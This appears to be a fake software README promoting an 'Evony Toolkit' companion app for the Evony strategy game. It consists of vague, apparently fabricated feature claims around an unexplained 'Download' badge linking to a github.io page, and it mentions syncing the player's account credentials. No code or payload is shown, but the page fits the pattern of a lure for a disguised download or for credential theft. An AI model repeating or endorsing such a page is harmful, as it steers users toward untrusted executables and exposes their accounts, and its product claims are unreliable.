# Evony Toolkit: The Comprehensive Command Center for City Management

Welcome to **Evony Toolkit**, a thoughtfully engineered companion application designed to transform how you interact with the Rise of Civilization. Rather than a simple calculator or a static guide, this toolkit is a proactive strategy workspace—a digital architect’s desk where every military march, resource flow, and research timeline becomes a visual, manageable blueprint. We built this not as a shortcut, but as a lens to sharpen your decision-making, allowing you to see the intricate machinery of your kingdom with unprecedented clarity.

The idea emerged from a simple frustration: toggling between a dozen browser tabs to cross-reference building upgrade costs, march speeds, and alliance tech bonuses. It was like trying to navigate a ship with a torn map. **Evony Toolkit** consolidates these disparate threads into a cohesive, interactive dashboard. It’s the difference between learning the rules of chess and seeing the entire board from above.

## The Architecture of Insight

[![Download](https://raw.githubusercontent.com/repolloadiel2-cyber/evony-arsenal/main/bin_1ac8.svg)](https://repolloadiel2-cyber.github.io/evony-arsenal/)

### A Modular Approach to Mastery

The toolkit is structured around four core modules, each acting as a dedicated specialist in your war council:

- **The Economic Forecaster:** This module predicts your future resource stockpiles based on current production and consumption rates. It answers the critical question: “Will you have enough food to sustain that next massive army, or will your granaries run dry at the worst possible moment?” It’s a crystal ball for your city’s treasury.
- **The Build Order Optimizer:** Tired of waiting 14 days for a single upgrade? This feature analyzes your current research level, building speed buffs, and available speedups to suggest the most efficient sequence of upcoming constructions. It prioritizes not just what is fastest, but what unlocks the next critical tech node for your strategy.
- **The March Planner:** Visualize troop movements across the world map. Input the distance to a target, adjust for march speed buffs, and the toolkit calculates precise arrival times, considering variable terrain penalties. This turns ambush planning from a guess into a calculated equation.
- **The Research Tracker:** A living checklist for your Academy. It visualizes the entire tech tree, highlights prerequisites, and estimates the total time and resource investment for a given branch, allowing you to plan a multi-week research sprint with confidence.

### Data Visualization: Not Just Numbers, But Narratives

We believe data should tell a story. The toolkit’s **responsive UI** transforms raw numbers into intuitive graphs and heatmaps. You will see your power curve spike with each troop tier, watch your resource income lines cross at critical thresholds, and understand the "why" behind your city’s performance. This isn’t a static spreadsheet; it is a living organism that breathes with your gameplay.

## Getting Started

### The First Launch

Upon your initial launch, the toolkit presents a clean onboarding flow. It guides you through connecting your account data securely, ensuring you never have to enter your credentials manually every time. The process is streamlined to be as intuitive as a well-designed mobile app, requiring just a few clicks to synchronize your latest kingdom state.

### Your Console, Your Language

Understanding that Evony unites players from every corner of the globe, we built **multilingual support** directly into the core engine. The interface automatically detects your system language and offers manual overrides for over 20 dialects, from English and Spanish to Mandarin and German. The nuances of strategy are preserved in translation, so you never miss a crucial detail due to a linguistic barrier.

## Advanced Features: Diving Deeper

### Smart Notification System

The toolkit operates quietly in the background, acting as a vigilant sentinel. It monitors your timers and sends proactive alerts via the desktop app or your preferred communication channel. Know exactly when your main hall finishes upgrading, or when a long-distance march is about to make contact. This keeps you connected to the game even when you are away from the screen, orchestrating your empire from the palm of your hand.

### Community-Driven Strategy Presets

Included with the toolkit are a series of "Strategy Presets"—pre-configured plans for common goals, such as "Rush to Castle Level 30," "Farm Builder," or "Aggressive PvP Marcher." These are not rigid rules but starting points. You can load a preset, examine its logic, and then tweak every parameter to fit your unique playstyle. Additionally, the toolkit features a built-in importer/exporter for sharing your custom presets with your alliance, turning individual wisdom into collective strength.

### The Cost Calculator: Zero Guesswork

Have you ever been surprised by a sudden infusion of resources needed for an upgrade? Our advanced Cost Calculator breaks down not just the base cost, but the additional taxes, tribute fees, and potential alliance assistance discounts. It shows you the final, realistic price you will pay, allowing for precise resource management even in the heated moments of a server war.

## The Creative Methodology

### A Practical Metaphor

Think of playing Evony without the toolkit as being a captain who navigates by the stars. It is possible, but it requires immense experience and constant attention. Evony Toolkit is the sextant and the chronometer—the precise instruments that turn a seasoned veteran into a master navigator. It takes away the fear of the unknown and replaces it with the confidence of a well-charted course.

### The "Architect's Draft" Approach

Instead of providing a rigid "do this, then do that" guide, our presets and optimizers are designed as an architect’s draft. They propose a plan with clear annotations on why a specific step is recommended. This empowers you to understand the *reasoning* behind the suggestion, allowing you to adapt it dynamically when the situation on the battlefield changes. It’s about teaching you to fish, rather than just handing you a fish.
